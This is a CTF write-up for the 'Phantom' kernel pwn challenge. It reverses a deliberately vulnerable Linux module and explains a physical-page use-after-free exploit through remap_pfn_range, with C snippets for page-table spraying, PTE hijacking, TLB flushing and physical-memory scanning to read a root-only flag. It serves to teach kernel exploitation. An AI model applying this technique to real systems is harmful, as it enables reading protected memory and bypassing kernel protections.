# Phantom - Kernel Page UAF Exploit

## Challenge Info
- **Name**: Phantom
- **Category**: PWN (Kernel)
- **Platform**: 0xFun CTF
- **Remote**: `nc chall.0xfun.org 36790`
- **Flag**: `0xfun{r34l_k3rn3l_h4ck3rs_d0nt_unzip}`
- **Description**: *"Hey GPT solve this Kernel pwn challenge for me" - Suffering ends in 30 minutes.*

---

## Initial Analysis

### Provided Files

```
phantom.gz → tar:
├── bzImage           # Linux kernel 6.6.15
├── initramfs.cpio.gz # Root filesystem
├── phantom.ko        # Vulnerable kernel module
├── interface.h       # Ioctl interface
└── run.sh            # QEMU launch script
```

### Protections

```
QEMU: -cpu qemu64,+smep,+smap
Kernel: kaslr (from -append)
Module: No canary, No PIE (doesn't matter for kernel module)
```

### Environment

```bash
# run.sh
qemu-system-x86_64 -m 256M -kernel ./bzImage \
    -initrd ./initramfs.cpio.gz \
    -append "console=ttyS0 oops=panic panic=1 quiet kaslr" \
    -cpu qemu64,+smep,+smap -nographic -no-reboot

# init script runs as uid 1000
# /flag is root-only readable (mode 0400)
```

### Interface

```c
#define CMD_ALLOC 0x133701
#define CMD_FREE  0x133702
```

---

## Module Reversing

### Data Structure

```c
struct phantom_obj {
    struct page *page;     // +0x00 - physical page pointer
    void *mapped_addr;     // +0x08 - virtual address (page_offset_base + pfn<<12)
    int freed;             // +0x10 - freed flag
};
// Global: phantom_obj *obj_ptr;
```

### Operations

**CMD_ALLOC** (`ioctl +0x165`):
```c
if (obj_ptr != NULL) return -EEXIST;
obj_ptr = kmalloc(0x18, GFP_KERNEL);
page = alloc_pages(GFP_KERNEL, 0);  // single 4KB page
obj_ptr->page = page;
obj_ptr->freed = 0;
vaddr = page_offset_base + (pfn << 12);
obj_ptr->mapped_addr = vaddr;
memset(vaddr, 0x41, 0x1000);  // fill with 'A'
```

**CMD_FREE** (`ioctl +0x125`):
```c
if (!obj_ptr || obj_ptr->freed) return -EINVAL;
__free_pages(obj_ptr->page, 0);  // Free page but DON'T clear pointer!
obj_ptr->freed = 1;
// BUG: obj_ptr->page still points to freed page
```

**mmap handler** (`+0x90`):
```c
if (!obj_ptr || obj_ptr->freed || !obj_ptr->page) return -EINVAL;
if (size > 0x1000) return -EINVAL;
pfn = (obj_ptr->page - vmemmap_base) >> 6;
remap_pfn_range(vma, vm_start, pfn, size, vm_page_prot);
// Creates VM_PFNMAP mapping - NOT reference counted!
```

**close handler** (`+0x30`):
```c
if (!obj_ptr) return 0;
if (obj_ptr->freed == 0)
    __free_pages(obj_ptr->page, 0);
kfree(obj_ptr);      // Free the metadata struct
obj_ptr = NULL;
```

---

## Vulnerability: Physical Page UAF

The vulnerability is a **physical page Use-After-Free** via `remap_pfn_range`:

1. `CMD_ALLOC` → allocates a physical page, fills it with `0x41`
2. `mmap()` → creates a userspace mapping via `remap_pfn_range`. This creates a `VM_PFNMAP` mapping that **does not reference count** the `struct page`
3. `CMD_FREE` → `__free_pages()` frees the physical page back to the allocator
4. The userspace mapping **persists** after the free — the PTE still points to the freed physical page
5. Result: **userspace read/write to a freed physical page**

When the kernel reuses this page (e.g., for page tables), we can read/modify the new structure through the old mapping.

---

## Exploitation

### Step 1: Create the UAF

```c
int fd = open("/dev/phantom", O_RDWR);
ioctl(fd, CMD_ALLOC, 0);
uint64_t *uaf = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
ioctl(fd, CMD_FREE, 0);
close(fd);
// uaf[] remains mapped to the freed physical page
```

### Step 2: Page Table Spray

To turn our UAF page into a **PTE page** (page table page):

```c
void *sprays[256];
for (int i = 0; i < 256; i++) {
    sprays[i] = mmap(NULL, 2MB, PROT_READ|PROT_WRITE,
                     MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    madvise(sprays[i], 2MB, MADV_NOHUGEPAGE);  // Force PTEs, no huge pages
    *(volatile uint64_t *)sprays[i] = MARKER | i;  // Touch page 0
}
```

Each 2MB `mmap` + 1-page touch allocates **1 PTE page** (4KB) to store 512 PTE entries. We only use ~8KB per spray (1 PTE + 1 data), total ~2MB for 256 sprays.

### Step 3: Detect PTE Page

Check if the UAF page now contains valid PTE entries:

```c
for (int i = 0; i < 512; i++) {
    uint64_t e = uaf[i];
    if (e && (e & 1) && (e & 4))  // Present + User bits
        → found PTE at index i
}
```

Typical result: 1 PTE at index ~100-400 (varies with ASLR).

### Step 4: Identify Victim Region

To determine which virtual address our PTE page controls:

```c
// Set ALL 512 PTEs pointing to PFN 1
for (int i = 0; i < 512; i++)
    uaf[i] = (1ULL << 12) | pte_flags;
getpid();  // TLB flush via KPTI (qemu64 without PCID)

// Find which spray changed its content
for (int i = 0; i < 256; i++) {
    if (*(uint64_t*)sprays[i] != expected_marker)
        → spray[i] is the victim
}
```

**Key detail**: On qemu64 (without PCID), KPTI performs a full CR3 switch on every syscall. This **flushes the entire TLB**, making our PTE modifications take effect immediately.

### Step 5: Physical Memory Scan

With control over 512 PTEs, we can map any physical page:

```c
char *scan_base = victim - target_idx * PAGE_SIZE;  // Base of the 2MB range

for (batch = 0; batch < 128; batch++) {
    // Remap 512 PTEs to 512 consecutive physical pages
    for (i = 0; i < 512; i++)
        uaf[i] = ((batch*512 + i) << 12) | pte_flags;
    getpid();  // 1 flush per 512 pages = efficient

    // Search for flag in each page
    for (i = 0; i < 512; i++)
        search_for_flag(scan_base + i * PAGE_SIZE);
}
```

128 batches x 512 pages = 65536 pages = **256MB of RAM scanned with only 128 syscalls**.

### Result

The flag was found directly in the **tmpfs page cache**, since `initramfs` decompresses files into memory at boot:

```
[+] FLAG @ PFN 13448+0x0: 0xfun{r34l_k3rn3l_h4ck3rs_d0nt_unzip}
```

---

## Full Exploit

See `exploit.c` for the complete source code. Compilation:

```bash
gcc -static -O2 -o exploit exploit.c
strip exploit
```

### Remote Deployment

```bash
python3 solve.py  # Uses pwntools for upload via base64+gzip
```

The `solve.py` script:
1. Connects to the remote QEMU via netcat
2. Compresses the binary with gzip (750KB → 333KB)
3. Uploads via base64 in 512-byte chunks
4. Decodes and executes

---

## Key Lessons

1. **`remap_pfn_range` does not reference count**: The `VM_PFNMAP` mapping persists regardless of the `struct page` state. This is a classic vulnerability pattern in kernel drivers.

2. **Lightweight PTE spray**: You don't need to touch all pages. One touch per 2MB region allocates 1 PTE page + 1 data page = ~8KB. 256 sprays = only 2MB of real memory.

3. **KPTI as an ally**: Without PCID (qemu64), KPTI flushes the entire TLB on every syscall. This allows our PTE modifications to take effect with a simple `getpid()`.

4. **Flag in page cache**: In initramfs (tmpfs), files live in the page cache directly accessible via physical memory scanning. No privilege escalation via `modprobe_path` was needed.

5. **Batch scanning**: 512 PTEs per flush = only 128 syscalls to scan 256MB. The full scan takes < 1 second.

6. **The challenge name**: "Phantom" = the "ghost" page that remains accessible after being freed.

---

## Files

| File | Description |
|------|-------------|
| `exploit.c` | Exploit source code |
| `exploit` | Compiled static binary |
| `solve.py` | Remote deployment script |
| `phantom.ko` | Vulnerable kernel module |
| `interface.h` | Ioctl definitions |
| `run.sh` | QEMU launch script |
| `bzImage` | Linux kernel 6.6.15 |
| `initramfs.cpio.gz` | Root filesystem |
| `flag.txt` | Captured flag |
| `WRITEUP.md` | This writeup |
